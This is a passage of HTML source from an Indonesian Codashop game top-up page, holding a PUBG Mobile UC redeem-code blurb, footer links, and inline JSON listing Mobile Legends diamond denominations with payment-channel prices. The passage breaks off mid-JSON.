        Kode Redeem UC PUBG Mobile adalah kode yang dapat Anda tukarkan di halaman resmi pembayaran PUBG Mobile menjadi Unknown Cash. Untuk membelinya, cukup masukan jumlah Unknown Cash yang Anda inginkan, selesaikan pembayaran, dan kode voucher yang dapat Anda tukarkan menjadi UC akan dikirimkan melalui email yang telah Anda daftarkan secara instan.
            <br/>
            <br> Belum melihat metode pembayaran yang anda inginkan?
            <br/><a href="https://codashop.typeform.com/to/Ah8wUl?source=mobilelegends&country=indonesia" target="_blank" style="background: none; text-decoration: underline !important; color: orange; padding: 0 0 0 0;float: unset;">Mohon beri tahu kami bagaimana anda ingin membayar!</a>
            <br/>

        </article>
    </section>

    <footer class="footer-container">

        <section class="footer-element-wrapper">

            <div class="footer__help-and-country-container">
                <div class="footer__help">
                    <div class="footer__help-title">
                        Butuh Bantuan?
                    </div>
                    <div class="footer__help-link">
                        <a href='https://support.codapay.com/hc/en-us/categories/360000012223-Indonesia' target="_blank" class="help-link-color">
                        Hubungi Kami
                    </a>
                    </div>
                </div>
                <div class="footer__country">
                    <a href="/international">
                        <i class='f32_indonesia' id="footer__country-flag"></i>
                        <div class="footer__country-name">
                            Indonesia
                        </div>
                    </a>
                </div>
            </div>

            <div class="footer__elements-group--left">
                <div class="footer__elements-group__wrapper">
                    <div class="footer__logo-container">
                        <div class="footer__logo-title">
                            Dipersembahkan oleh
                        </div>
                        <img class="footer__logo-image" src="https://cdn1.codashop.com/S/content/common/images/logo-codapay.png" alt="">
                    </div>

                    <div class="footer__social-media-container">

                        <p class="social-text">Dapatkan berita Coda di:</p>

                        <a href='https://www.facebook.com/Codashop.IDofficial/' target="_blank">
                            <img src="https://cdn1.codashop.com/S/content/mobile/images/sosmed-icons/facebook_icon.png" alt="" class="footer__social-media-box">
                        </a>

                        <a href='https://www.youtube.com/c/CodashopOfficial' target="_blank">
                            <img src="https://cdn1.codashop.com/S/content/mobile/images/sosmed-icons/youtube_icon.png" alt="" class="footer__social-media-box">
                        </a>

                        <a href='https://www.instagram.com/codashop.idofficial/' target="_blank">
                            <img src="https://cdn1.codashop.com/S/content/mobile/images/sosmed-icons/instagram_icon.png" alt="" class="footer__social-media-box">
                        </a>

                    </div>
                </div>
                <div class="footer__customer-service">

                    <div class="footer-menu-group">
                        <h3> <a target="_blank" href="https://support.codapay.com/hc/en-us/categories/360000012223-Indonesia" style="border-bottom: 1px #9a9a9a solid; line-height: 41px;">Bantuan Pelanggan</a> </h3> </div>

                </div>
            </div>

            <div class="footer__elements-group--right">
                <div class="footer__terms-and-policy">
                    <a href='https://www.codapay.com/toc' target="_blank" class="footer__term-link">
                    Syarat & Ketentuan
                </a>
                    <span class="footer-text-divider"> | </span>
                    <a href='https://www.codapay.com/privacy-policy' target="_blank" class="footer__policy-link">
                    Kebijakan Privasi
                </a>
                </div>

                <div class="footer__copyrights">
                    &#169; Hak Cipta Coda Payments 2019
                </div>
            </div>

        </section>

    </footer>

    <script type="text/javascript" src="https://cdn1.codashop.com/S/content/common/js/custom-page.js?v=197"></script>
    <script type="text/javascript" src="../content/pages/js/productPage.js"></script>
    <script type="text/javascript" src="../content/common/js/common-sw.js?v=197"></script>

    <script type="text/javascript">
        $(document).ready(function() {
            CODA.Shop.voucherDenoms = JSON.parse('[{"displayPrice":"3 Diamonds","id":1543,"sellerId":50,"voucherId":"diamond_codashopIDR_1500_telco","skuHashId":-1624509378,"sortOrderId":1,"voucherPricePoints":[{"id":12474,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20341,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12481,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12479,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12477,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12470,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%) (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12478,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12473,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1500.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.500","deal":false},{"id":12472,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20340,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12475,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12476,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12480,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":12471,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":29267,"voucherDenominationId":1543,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"5 Diamonds","id":250,"sellerId":50,"voucherId":"diamond_codashopIDR_1500","skuHashId":-1624509378,"sortOrderId":2,"voucherPricePoints":[{"id":1771,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1772,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1776,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20343,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1425.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.425","deal":true},{"id":1778,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1500.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.500","deal":false},{"id":1773,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":9115,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1777,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":29268,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":4150,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1425.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.425","deal":true},{"id":1769,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20342,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1425.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.425","deal":true},{"id":11487,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":1500.0,"channelVariablePrice":false,"displayPrice":"Rp. 1.500","deal":false},{"id":1770,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1774,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1779,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":2862,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1775,"voucherDenominationId":250,"pricePointPaymentChannel":{"id":24,"name":"TELKOMSEL","displayName":"Telkomsel","displayName2":"Telkomsel","isMno":true,"sortOrder":3,"countryCode":360,"tagline":"Beli pakai pulsa Telkomsel","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/TELKOMSEL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false}],"_status":1,"variableDenominationVoucher":false},{"displayPrice":"12 Diamonds","id":251,"sellerId":50,"voucherId":"diamond_codashopIDR_3500","skuHashId":-1624509378,"sortOrderId":3,"voucherPricePoints":[{"id":1789,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":223,"name":"DOKU_WALLET","displayName":"DOKU Wallet","displayName2":"DOKU Wallet","isMno":false,"sortOrder":30,"countryCode":360,"tagline":"Bayar dengan DOKU Wallet","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_WALLET_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":3500.0,"channelVariablePrice":false,"displayPrice":"Rp. 3.500","deal":false},{"id":20345,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":240,"name":"DANA","displayName":"Dana","displayName2":"Dana","isMno":false,"sortOrder":11,"countryCode":360,"tagline":"Bayar dengan Dana","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/DANA_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":3325.0,"channelVariablePrice":false,"displayPrice":"Rp. 3.325","deal":true},{"id":2863,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":226,"name":"Indomaret","displayName":"Indomaret","displayName2":"Indomaret","isMno":false,"sortOrder":22,"countryCode":360,"tagline":"Bayar di Indomaret","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/Indomaret_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1782,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":400,"name":"CARD_PAYMENT","displayName":"Kartu Kredit","displayName2":"Card Payment ID","isMno":false,"sortOrder":26,"countryCode":360,"tagline":"Bayar dengan kartu kredit","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/Card_Payment_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1781,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":221,"name":"DOKU_OTC","displayName":"Alfamart","displayName2":"Alfamart","isMno":false,"sortOrder":18,"countryCode":360,"tagline":"Bayar di Alfamart","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_OTC_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":20344,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":230,"name":"OVO","displayName":"OVO","displayName2":"OVO","isMno":false,"sortOrder":1,"countryCode":360,"tagline":"Bayar dengan OVO","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/OVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":3325.0,"channelVariablePrice":false,"displayPrice":"Rp. 3.325","deal":true},{"id":1788,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":25,"name":"BOLT","displayName":"Bolt","displayName2":"Bolt","isMno":true,"sortOrder":38,"countryCode":360,"tagline":"Beli pakai pulsa Bolt. Nomor Ponsel \u003d Nomor BOLT! (999xxxxxxx)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BOLT_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1780,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":220,"name":"DOKU_ATM","displayName":"Bank Transfer","displayName2":"Bank Transfer Indonesia","isMno":false,"sortOrder":2,"countryCode":360,"tagline":"Bayar melalui ATM atau transfer Mobile Banking","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/DOKU_ATM_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":4151,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":227,"name":"GO_PAY","displayName":"GoPay","displayName2":"GoPay","isMno":false,"sortOrder":0,"countryCode":360,"tagline":"Bayar dengan CodaPay (Diskon 100%)","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/GO_PAY_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":3325.0,"channelVariablePrice":false,"displayPrice":"Rp. 3.325","deal":true},{"id":1785,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":23,"name":"XL","displayName":"XL Axiata","displayName2":"XL Axiata","isMno":true,"sortOrder":9,"countryCode":360,"tagline":"Beli pakai pulsa XL","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/XL_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":29269,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":234,"name":"LINKAJA_ID","displayName":"LinkAja","displayName2":"LinkAja","isMno":false,"sortOrder":12,"countryCode":360,"tagline":"Bayar dengan LinkAja","tutorialType":2,"tutorialURL":"  https://cdn1.codashop.com/S/content/common/images/mno/linkaja_tutorial.jpg","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/LINKAJA_ID_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1783,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":224,"name":"SEVELIN","displayName":"7-Eleven (Indonesia)","displayName2":"7-Eleven","isMno":false,"sortOrder":34,"countryCode":360,"tagline":"Bayar di 7-Eleven","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/SEVELIN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1784,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":22,"name":"INDOSAT","displayName":"Indosat","displayName2":"Indosat","isMno":true,"sortOrder":5,"countryCode":360,"tagline":"Beli pakai pulsa Indosat","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/INDOSAT_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":5000.0,"channelVariablePrice":false,"displayPrice":"Rp. 5.000","deal":false},{"id":9116,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":228,"name":"TRUE_MONEY_AGENT_NETWORK","displayName":"TrueMoney","displayName2":"TMAN (Indonesia)","isMno":false,"sortOrder":50,"countryCode":360,"tagline":"Bayar di TrueMoney Agent","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/TRUE_MONEY_AGENT_NETWORK_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 0","deal":false},{"id":1787,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":26,"name":"HUTCH_THREE","displayName":"Tri Indonesia","displayName2":"Tri Indonesia","isMno":true,"sortOrder":7,"countryCode":360,"tagline":"Beli pakai pulsa Tri Indonesia","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/HUTCH_THREE_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":5000.0,"channelVariablePrice":false,"displayPrice":"Rp. 5.000","deal":false},{"id":11488,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":229,"name":"KREDIVO","displayName":"Kredivo","displayName2":"Kredivo (Indonesia)","isMno":false,"sortOrder":14,"countryCode":360,"tagline":"Cicilan Tanpa Kartu Kredit","tutorialType":1,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/S/content/common/images/mno/KREDIVO_CHNL_LOGO.png","enabled":true,"channelStatus":1,"statusMessage":""},"price":3500.0,"channelVariablePrice":false,"displayPrice":"Rp. 3.500","deal":false},{"id":1790,"voucherDenominationId":251,"pricePointPaymentChannel":{"id":200,"name":"BITX_IDN","displayName":"Bitcoin","displayName2":"BitX IND","isMno":false,"sortOrder":42,"countryCode":360,"tagline":"Bayar dengan Bitcoin","tutorialType":0,"tutorialURL":"","channelLogoUrl":"https://cdn1.codashop.com/K/content/common/images/mno/BITX_IDN_CHNL_LOGO.png","enabled":true,"channelStatus":4,"statusMessage":""},"price":0.0,"channelVariablePrice":false,"displayPrice":"Rp. 